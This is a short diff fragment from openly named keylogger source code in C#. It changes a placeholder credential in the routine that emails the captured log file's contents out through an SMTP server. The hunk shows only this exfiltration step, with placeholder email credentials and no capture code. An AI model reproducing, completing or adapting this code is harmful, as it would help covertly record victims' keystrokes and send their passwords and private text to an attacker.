@@ -183,7 +183,7 @@ namespace KeyLogger
                 mail.Body = content; //Set the mail body (the data from the .txt file).
 
                 server.Port = 587;
-                server.Credentials = new NetworkCredential("YOUREMAIL", "EMAILPASSWORD"); //Mail credentials for sending the Log.
+                server.Credentials = new NetworkCredential("EMAILSENDER", "EMAILPASSWORD"); //Mail credentials for sending the Log.
                 server.EnableSsl = true; //Use SSL?
                 server.Send(mail); //Send the Log via mail.
             }
